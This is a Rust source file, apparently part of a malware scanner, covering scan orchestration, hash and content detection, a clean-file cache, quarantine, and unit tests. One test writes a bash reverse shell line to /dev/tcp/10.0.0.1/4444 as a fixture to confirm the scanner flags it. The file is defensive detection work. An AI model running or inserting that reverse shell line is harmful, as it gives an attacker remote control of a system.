//! Scan orchestration: walking directories, running every engine and
//! producing findings/reports.

use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Instant;

use zs_core::config::ScannerConfig;
use zs_core::error::{ZsError, ZsResult};
use zs_core::model::{Detection, Finding, Hashes, ScanOptions, ScanReport, Severity, Verdict};
use zs_core::storage::Storage;
use zs_core::util::{now_millis, now_secs};

use crate::builtins;
use crate::elf;
use crate::hash;
use crate::quarantine::Quarantine;
use crate::rules::RuleSet;
use crate::signatures;

/// Engine level filesystem skips (virtual filesystems).
const SKIP_ABSOLUTE: &[&str] = &["/proc", "/sys", "/dev", "/run"];
const MAX_DEPTH: u32 = 64;
/// Emit a progress event for every file: up to `PROGRESS_ALWAYS` files, then
/// every `PROGRESS_EVERY` files, to keep IPC traffic sane on huge scans.
const PROGRESS_ALWAYS: u64 = 100;
const PROGRESS_EVERY: u64 = 50;

pub enum Progress {
    File {
        path: String,
        files: u64,
        bytes: u64,
    },
    Skipped {
        path: String,
        reason: String,
    },
    Finding(Finding),
}

struct Stats {
    scan_id: String,
    files: u64,
    bytes: u64,
    cached: u64,
    skipped: u64,
    errors: u64,
    findings: Vec<Finding>,
    max_score: u32,
    /// Clean-file cache generation for this scan (None when disabled).
    cache_version: Option<String>,
}

pub struct Scanner {
    cfg: ScannerConfig,
    pub(crate) storage: Option<Arc<Storage>>,
    rules: RuleSet,
    /// Fingerprint of `rules`, combined with the signature fingerprint to
    /// invalidate the clean-file cache when detections change.
    rules_fingerprint: String,
    pub(crate) quarantine: Option<Arc<Quarantine>>,
}

impl Scanner {
    pub fn new(
        cfg: ScannerConfig,
        storage: Option<Arc<Storage>>,
        quarantine: Option<Arc<Quarantine>>,
    ) -> ZsResult<Self> {
        let mut rules = RuleSet::with_embedded()?;
        for dir in &cfg.rule_dirs {
            match rules.load_dir(dir) {
                Ok(n) if n > 0 => tracing::info!("loaded {n} rules from {}", dir.display()),
                Ok(_) => {}
                Err(e) => tracing::warn!("failed to load rules from {}: {e}", dir.display()),
            }
        }
        let rules_fingerprint = rules.fingerprint();
        Ok(Self {
            cfg,
            storage,
            rules,
            rules_fingerprint,
            quarantine,
        })
    }

    /// Clean-file cache generation for a given set of scan options. Combines
    /// the signature-set fingerprint, the rules fingerprint and the depth of
    /// the scan, so any change makes every cached verdict stale.
    fn cache_version_for(&self, opts: &ScanOptions) -> Option<String> {
        if !opts.clean_cache {
            return None;
        }
        let storage = self.storage.as_ref()?;
        match storage.signature_fingerprint() {
            Ok(sig) => Some(format!(
                "{sig}:{}:cs{}:cm{}",
                self.rules_fingerprint,
                if opts.content_scan { 1 } else { 0 },
                self.cfg.content_scan_max_bytes
            )),
            Err(e) => {
                tracing::warn!("cannot compute signature fingerprint: {e}");
                None
            }
        }
    }

    pub fn rules(&self) -> &RuleSet {
        &self.rules
    }

    pub fn config(&self) -> &ScannerConfig {
        &self.cfg
    }

    /// Scan a file or directory. Generates a fresh scan id.
    pub fn scan(
        &self,
        target: &Path,
        opts: &ScanOptions,
        progress: &mut dyn FnMut(Progress),
    ) -> ZsResult<ScanReport> {
        let scan_id = format!("scan-{}-{}", now_millis(), std::process::id());
        self.scan_named(&scan_id, target, opts, progress)
    }

    /// Scan with a caller provided id (so streaming events can reference it).
    pub fn scan_named(
        &self,
        scan_id: &str,
        target: &Path,
        opts: &ScanOptions,
        progress: &mut dyn FnMut(Progress),
    ) -> ZsResult<ScanReport> {
        let started = Instant::now();
        let started_at = now_secs();
        let mut stats = Stats {
            scan_id: scan_id.to_string(),
            files: 0,
            bytes: 0,
            cached: 0,
            skipped: 0,
            errors: 0,
            findings: Vec::new(),
            max_score: 0,
            cache_version: self.cache_version_for(opts),
        };

        let meta = std::fs::metadata(target).map_err(|e| ZsError::io(target, e))?;
        if meta.is_dir() {
            self.walk_dir(target, opts, &mut stats, progress);
        } else {
            self.process_file(target, opts, &mut stats, progress);
        }

        let duration_ms = started.elapsed().as_millis() as u64;
        let verdict = if stats.max_score > 0 {
            Verdict::from_score(stats.max_score)
        } else {
            Verdict::Clean
        };

        let report = ScanReport {
            scan_id: stats.scan_id.clone(),
            target: target.display().to_string(),
            started_at,
            duration_ms,
            files_scanned: stats.files,
            bytes_scanned: stats.bytes,
            files_skipped: stats.skipped,
            errors: stats.errors,
            max_score: stats.max_score,
            verdict,
            findings: stats.findings,
            cached: stats.cached,
        };

        if opts.record {
            if let Some(storage) = &self.storage {
                if let Err(e) = storage.record_scan(
                    &report.scan_id,
                    &report.target,
                    report.files_scanned,
                    report.bytes_scanned,
                    report.findings.len() as u64,
                    report.max_score,
                    report.duration_ms,
                ) {
                    tracing::warn!("failed to record scan: {e}");
                }
            }
        }
        Ok(report)
    }

    fn walk_dir(
        &self,
        root: &Path,
        opts: &ScanOptions,
        stats: &mut Stats,
        progress: &mut dyn FnMut(Progress),
    ) {
        let mut stack: Vec<(PathBuf, u32)> = vec![(root.to_path_buf(), 0)];
        while let Some((dir, depth)) = stack.pop() {
            if depth > MAX_DEPTH {
                stats.skipped += 1;
                continue;
            }
            let entries = match std::fs::read_dir(&dir) {
                Ok(e) => e,
                Err(e) => {
                    stats.errors += 1;
                    progress(Progress::Skipped {
                        path: dir.display().to_string(),
                        reason: format!("cannot read directory: {e}"),
                    });
                    continue;
                }
            };
            for entry in entries {
                let entry = match entry {
                    Ok(e) => e,
                    Err(_) => {
                        stats.errors += 1;
                        continue;
                    }
                };
                let path = entry.path();

                // Do not follow symlinks unless requested.
                let meta = match entry.metadata() {
                    Ok(m) => m,
                    Err(e) => {
                        stats.errors += 1;
                        tracing::debug!("metadata failed for {}: {e}", path.display());
                        continue;
                    }
                };

                if meta.file_type().is_symlink() {
                    if !opts.follow_symlinks {
                        stats.skipped += 1;
                        continue;
                    }
                    match std::fs::metadata(&path) {
                        Ok(m) if m.is_dir() => {
                            if opts.recursive && !self.is_excluded_dir(&path) {
                                stack.push((path, depth + 1));
                            }
                        }
                        Ok(m) if m.is_file() => self.process_file(&path, opts, stats, progress),
                        _ => stats.skipped += 1,
                    }
                    continue;
                }

                if meta.is_dir() {
                    if opts.recursive && !self.is_excluded_dir(&path) {
                        stack.push((path, depth + 1));
                    } else if !opts.recursive {
                        stats.skipped += 1;
                    }
                } else if meta.is_file() {
                    self.process_file(&path, opts, stats, progress);
                } else {
                    stats.skipped += 1;
                }
            }
        }
    }

    fn is_excluded_dir(&self, path: &Path) -> bool {
        let as_str = path.to_string_lossy();
        if SKIP_ABSOLUTE.iter().any(|s| as_str == *s) {
            return true;
        }
        match path.file_name().and_then(|n| n.to_str()) {
            Some(name) => self.cfg.exclude_dirs.iter().any(|d| d == name),
            None => false,
        }
    }

    fn process_file(
        &self,
        path: &Path,
        opts: &ScanOptions,
        stats: &mut Stats,
        progress: &mut dyn FnMut(Progress),
    ) {
        use std::os::unix::fs::MetadataExt;

        let meta = match std::fs::metadata(path) {
            Ok(m) => m,
            Err(e) => {
                stats.errors += 1;
                progress(Progress::Skipped {
                    path: path.display().to_string(),
                    reason: format!("cannot stat: {e}"),
                });
                return;
            }
        };
        if !meta.is_file() {
            stats.skipped += 1;
            return;
        }
        let size = meta.len();
        let size_u64: u64 = size;

        // Never scan our own quarantine artifacts.
        if path.extension().and_then(|e| e.to_str()) == Some(crate::QUARANTINE_EXT) {
            stats.skipped += 1;
            return;
        }

        if size_u64 > opts.max_file_size {
            stats.skipped += 1;
            progress(Progress::Skipped {
                path: path.display().to_string(),
                reason: format!("too large ({} bytes)", size),
            });
            return;
        }

        let path_str = path.display().to_string();
        let mtime = meta.mtime();

        // Clean-file cache: same path/size/mtime under the same signature and
        // rules version means the file was already fully scanned clean.
        if let (Some(version), Some(storage)) = (&stats.cache_version, &self.storage) {
            match storage.is_clean_file(&path_str, size_u64, mtime, version) {
                Ok(true) => {
                    stats.files += 1;
                    stats.cached += 1;
                    if stats.files <= PROGRESS_ALWAYS || stats.files % PROGRESS_EVERY == 0 {
                        progress(Progress::File {
                            path: path_str,
                            files: stats.files,
                            bytes: stats.bytes,
                        });
                    }
                    return;
                }
                Ok(false) => {}
                Err(e) => tracing::debug!("clean cache lookup failed for {path_str}: {e}"),
            }
        }

        // Hashes: from cache when possible.
        let cached = if opts.hash_cache {
            self.storage.as_ref().and_then(|s| {
                s.get_cached_hashes(&path_str, size_u64, mtime)
                    .ok()
                    .flatten()
            })
        } else {
            None
        };
        let hashes: Hashes = match cached {
            Some(h) => h,
            None => match hash::hash_file(path) {
                Ok(h) => {
                    if opts.hash_cache {
                        if let Some(storage) = &self.storage {
                            let _ = storage.put_cached_hashes(
                                &path_str,
                                size_u64,
                                mtime,
                                meta.ino(),
                                &h,
                            );
                        }
                    }
                    h
                }
                Err(e) => {
                    stats.errors += 1;
                    progress(Progress::Skipped {
                        path: path_str,
                        reason: format!("cannot hash: {e}"),
                    });
                    return;
                }
            },
        };

        let mut detections: Vec<Detection> = Vec::new();

        // 1. Hash signatures (imported + built-in).
        match signatures::lookup(self.storage.as_ref(), &hashes) {
            Ok(Some(d)) => detections.push(d),
            Ok(None) => {}
            Err(e) => tracing::warn!("signature lookup failed for {path_str}: {e}"),
        }

        // 2. Content rules + ELF heuristics.
        let mut content_buf: Option<Vec<u8>> = None;
        let mut fully_read = true;
        if opts.content_scan && size_u64 <= self.cfg.content_scan_max_bytes {
            match std::fs::read(path) {
                Ok(buf) => {
                    detections.extend(self.rules.check(&buf, path));
                    detections.extend(builtins::content_checks(&buf));
                    content_buf = Some(buf);
                }
                Err(e) => {
                    stats.errors += 1;
                    fully_read = false;
                    tracing::debug!("cannot read {path_str}: {e}");
                }
            }
        }
        if let Some(buf) = &content_buf {
            if elf::is_elf(buf) {
                detections.extend(elf::analyze(buf, path));
            }
        }

        detections = dedupe(detections);
        let score: u32 = detections.iter().map(|d| d.score).sum::<u32>().min(100);

        stats.files += 1;
        stats.bytes += size_u64;

        if score >= opts.min_report_score {
            let severity = Severity::from_score(score);
            let verdict = Verdict::from_score(score);
            let mut finding = Finding {
                path: path_str.clone(),
                size: size_u64,
                hashes,
                score,
                severity,
                verdict,
                detections,
                quarantined: false,
            };

            if opts.quarantine && verdict == Verdict::Malicious {
                if let Some(q) = &self.quarantine {
                    match q.quarantine(path, &finding) {
                        Ok(_) => finding.quarantined = true,
                        Err(e) => tracing::warn!("quarantine of {path_str} failed: {e}"),
                    }
                }
            }

            if let Some(storage) = &self.storage {
                if let Err(e) = storage.record_finding(Some(&stats.scan_id), &finding) {
                    tracing::warn!("failed to record finding: {e}");
                }
            }

            stats.max_score = stats.max_score.max(score);
            stats.findings.push(finding.clone());
            progress(Progress::Finding(finding));
        } else if score == 0 && fully_read {
            // Fully inspected with no signal at all: remember the verdict.
            if let (Some(version), Some(storage)) = (&stats.cache_version, &self.storage) {
                if let Err(e) = storage.mark_clean_file(&path_str, size_u64, mtime, version) {
                    tracing::debug!("cannot cache clean file {path_str}: {e}");
                }
            }
        }

        if stats.files <= PROGRESS_ALWAYS || stats.files % PROGRESS_EVERY == 0 {
            progress(Progress::File {
                path: path_str,
                files: stats.files,
                bytes: stats.bytes,
            });
        }
    }
}

/// Keep the highest scoring detection per name.
fn dedupe(mut detections: Vec<Detection>) -> Vec<Detection> {
    detections.sort_by_key(|d| std::cmp::Reverse(d.score));
    let mut seen = std::collections::HashSet::new();
    detections
        .into_iter()
        .filter(|d| seen.insert(d.name.clone()))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use zs_core::config::ScannerConfig;

    fn scanner() -> (tempfile::TempDir, Scanner) {
        let dir = tempfile::tempdir().unwrap();
        let storage = Arc::new(Storage::open_in_memory().unwrap());
        crate::signatures::seed_storage(&storage).unwrap();
        let quarantine = Arc::new(Quarantine::new(dir.path().join("q"), storage.clone()).unwrap());
        let cfg = ScannerConfig {
            rule_dirs: vec![],
            ..Default::default()
        };
        let scanner = Scanner::new(cfg, Some(storage), Some(quarantine)).unwrap();
        (dir, scanner)
    }

    #[test]
    fn detects_eicar_by_hash_and_content() {
        let (dir, scanner) = scanner();
        let victim = dir.path().join("eicar.com");
        std::fs::write(&victim, crate::builtins::eicar_bytes()).unwrap();

        let mut seen_findings = Vec::new();
        let report = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |p| {
                if let Progress::Finding(f) = p {
                    seen_findings.push(f);
                }
            })
            .unwrap();

        assert_eq!(report.verdict, Verdict::Malicious);
        assert!(report.max_score >= 100);
        assert_eq!(seen_findings.len(), 1);
        assert!(seen_findings[0]
            .detections
            .iter()
            .any(|d| d.name.contains("eicar")));
        assert!(!seen_findings[0].quarantined);
    }

    #[test]
    fn quarantine_option_moves_file() {
        let (dir, scanner) = scanner();
        let victim = dir.path().join("eicar2.com");
        std::fs::write(&victim, crate::builtins::eicar_bytes()).unwrap();

        let opts = ScanOptions {
            quarantine: true,
            ..Default::default()
        };
        let report = scanner.scan(dir.path(), &opts, &mut |_| {}).unwrap();
        assert_eq!(report.findings.len(), 1);
        assert!(report.findings[0].quarantined);
        assert!(!victim.exists());
    }

    #[test]
    fn clean_files_are_not_reported() {
        let (dir, scanner) = scanner();
        std::fs::write(dir.path().join("hello.txt"), b"just text\n").unwrap();
        let report = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert_eq!(report.verdict, Verdict::Clean);
        assert!(report.findings.is_empty());
        assert_eq!(report.files_scanned, 1);
    }

    #[test]
    fn reverse_shell_script_is_flagged() {
        let (dir, scanner) = scanner();
        let sh = dir.path().join("backdoor.sh");
        std::fs::write(&sh, b"#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n").unwrap();
        let report = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert!(report.verdict == Verdict::Suspicious || report.verdict == Verdict::Malicious);
    }

    #[test]
    fn recursive_and_excluded_dirs() {
        let (dir, scanner) = scanner();
        std::fs::create_dir_all(dir.path().join("node_modules")).unwrap();
        std::fs::create_dir_all(dir.path().join("src")).unwrap();
        std::fs::write(
            dir.path().join("node_modules/eicar.js"),
            crate::builtins::eicar_bytes(),
        )
        .unwrap();
        std::fs::write(dir.path().join("src/ok.txt"), b"fine").unwrap();

        let report = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert!(report.findings.is_empty(), "excluded dir must be skipped");
        assert_eq!(report.files_scanned, 1);
    }

    #[test]
    fn max_file_size_skips() {
        let (dir, scanner) = scanner();
        std::fs::write(dir.path().join("big.bin"), vec![0u8; 4096]).unwrap();
        let opts = ScanOptions {
            max_file_size: 1024,
            ..Default::default()
        };
        let report = scanner.scan(dir.path(), &opts, &mut |_| {}).unwrap();
        assert_eq!(report.files_scanned, 0);
        assert_eq!(report.files_skipped, 1);
    }

    #[test]
    fn hash_cache_reuses_hashes() {
        let (dir, scanner) = scanner();
        let f = dir.path().join("cached.txt");
        std::fs::write(&f, b"cacheme").unwrap();
        scanner
            .scan(&f, &ScanOptions::default(), &mut |_| {})
            .unwrap();
        let storage = scanner.storage.as_ref().unwrap();
        assert_eq!(storage.hash_cache_len().unwrap(), 1);
        // second scan of same file must not fail neither duplicate
        scanner
            .scan(&f, &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert_eq!(storage.hash_cache_len().unwrap(), 1);
    }

    #[test]
    fn clean_cache_skips_unchanged_files() {
        let (dir, scanner) = scanner();
        let f = dir.path().join("stable.txt");
        std::fs::write(&f, b"stable content").unwrap();

        let r1 = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert_eq!(r1.cached, 0);
        assert_eq!(r1.files_scanned, 1);
        let storage = scanner.storage.as_ref().unwrap();
        assert_eq!(storage.clean_cache_len().unwrap(), 1);

        // Untouched file: verdict comes from the cache, nothing is read.
        let r2 = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert_eq!(r2.cached, 1);
        assert_eq!(r2.files_scanned, 1);
        assert_eq!(r2.bytes_scanned, 0);

        // Modified file: size changed, so it is scanned again.
        std::fs::write(&f, b"stable content!").unwrap();
        let r3 = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert_eq!(r3.cached, 0);
        assert!(r3.bytes_scanned > 0);
    }

    #[test]
    fn clean_cache_invalidated_by_signature_import() {
        let (dir, scanner) = scanner();
        std::fs::write(dir.path().join("benign.txt"), b"benign").unwrap();
        scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();

        let r2 = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert_eq!(r2.cached, 1);

        // A new signature changes the fingerprint: cached verdicts are stale.
        let storage = scanner.storage.as_ref().unwrap();
        storage
            .insert_signature("ff00", "md5", "test", Severity::Low, "d", "test")
            .unwrap();
        let r3 = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert_eq!(r3.cached, 0);
    }

    #[test]
    fn clean_cache_can_be_disabled() {
        let (dir, scanner) = scanner();
        std::fs::write(dir.path().join("plain.txt"), b"data").unwrap();
        let opts = ScanOptions {
            clean_cache: false,
            ..Default::default()
        };
        scanner.scan(dir.path(), &opts, &mut |_| {}).unwrap();
        let r2 = scanner.scan(dir.path(), &opts, &mut |_| {}).unwrap();
        assert_eq!(r2.cached, 0);
        assert_eq!(
            scanner.storage.as_ref().unwrap().clean_cache_len().unwrap(),
            0
        );
    }

    #[test]
    fn malicious_files_are_never_cached() {
        let (dir, scanner) = scanner();
        std::fs::write(
            dir.path().join("eicar4.com"),
            crate::builtins::eicar_bytes(),
        )
        .unwrap();
        scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        let r2 = scanner
            .scan(dir.path(), &ScanOptions::default(), &mut |_| {})
            .unwrap();
        assert_eq!(r2.cached, 0);
        assert_eq!(r2.verdict, Verdict::Malicious);
        assert_eq!(
            scanner.storage.as_ref().unwrap().clean_cache_len().unwrap(),
            0
        );
    }

    #[test]
    fn record_false_skips_scan_history() {
        let (dir, scanner) = scanner();
        std::fs::write(dir.path().join("a.txt"), b"a").unwrap();
        let opts = ScanOptions {
            record: false,
            ..Default::default()
        };
        scanner.scan(dir.path(), &opts, &mut |_| {}).unwrap();
        assert_eq!(scanner.storage.as_ref().unwrap().scan_count().unwrap(), 0);
    }
}
